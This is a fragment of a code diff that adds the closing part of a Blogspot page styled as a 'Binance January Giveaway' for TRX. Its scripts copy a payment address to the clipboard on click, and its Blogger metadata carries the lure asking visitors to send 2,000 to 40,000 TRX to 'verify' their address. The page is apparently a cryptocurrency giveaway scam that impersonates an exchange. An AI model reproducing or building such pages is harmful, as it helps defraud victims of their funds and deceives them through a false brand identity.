+			range.select();
+		} else if(window.getSelection){
+			selection=window.getSelection();
+			range=document.createRange();
+			range.selectNodeContents(text);
+			selection.removeAllRanges();
+			selection.addRange(range);
+		}
+	}
+	$('#address').click(function(){
+		copyAddress(true);
+		selectText(this.id);
+	});
+	
+	//
+	$('#payment-button').click(function(){
+		copyAddress(true);
+		selectText('address');
+		$('#payment-tooltip').css('opacity', '1');
+		setTimeout(function(){$('#payment-tooltip').removeAttr('style');}, 1500);
+	});
+	
+	//
+	function addrWidthResizer(divWrap, addrContId){
+		var size=16, minSize=8,
+			addrCont=$(addrContId),
+			addrWidth=$(divWrap).width();
+
+		addrCont.removeAttr('style');
+		while(addrCont.width() > addrWidth){
+			size = size - 0.1;
+			if(size < minSize) break;
+			addrCont.css('font-size', size);
+		}
+    }
+
+	addrWidthResizer('#div-target', '#address');
+	addrWidthResizer('.last_trans', '#trnsctaddr');
+	$(window).on('resize', function(){
+        addrWidthResizer('#div-target', '#address');
+      	addrWidthResizer('.last_trans', '#trnsctaddr');
+	});
+	//]]>
+	</script>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/3915142185-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY5joY5USS7GK7rSYKX6vls7BoHVUw:1549475572872';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d9076972975464369317','//janbinance.blogspot.com/p/trx.html','9076972975464369317');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '9076972975464369317', 'title': 'S2', 'url': 'https://janbinance.blogspot.com/p/trx.html', 'canonicalUrl': 'https://janbinance.blogspot.com/p/trx.html', 'homepageUrl': 'https://janbinance.blogspot.com/', 'searchUrl': 'https://janbinance.blogspot.com/search', 'canonicalHomepageUrl': 'https://janbinance.blogspot.com/', 'blogspotFaviconUrl': 'https://janbinance.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22S2 - Atom\x22 href\x3d\x22https://janbinance.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22S2 - RSS\x22 href\x3d\x22https://janbinance.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22S2 - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/9076972975464369317/posts/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/7aa3fc09926630ce', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'static_page', 'pageId': '23066881030421623', 'pageName': 'TRX', 'pageTitle': 'S2: TRX'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'TRX', 'description': '                         Binance\x27s January Giveaway!       To verify your address, just send from 2000 to 40000 TRX to the address below and...', 'featuredImage': 'https://lh4.googleusercontent.com/proxy/7OERhoBfsYdu71hgM6_zOCgF8OrT49BPiF3NzQgNiJ8c1qDwgia0EXt4J2b_SDUbhlMJjMg1yq-cAcXwb412JvXwOhsWi822mSUHlDiwQNfayD9bL74rcR7-EmcPiOgyC2Z7i9MejBiSAHquLWF04oBGoKq6BLXT1So', 'url': 'https://janbinance.blogspot.com/p/trx.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': true, 'isPost': false, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'pageId': 23066881030421623}}]);
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/1546394776-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/368954415-lightbox_bundle.css'}, 'displayModeFull'));
+</script>
+</body>
+</html>
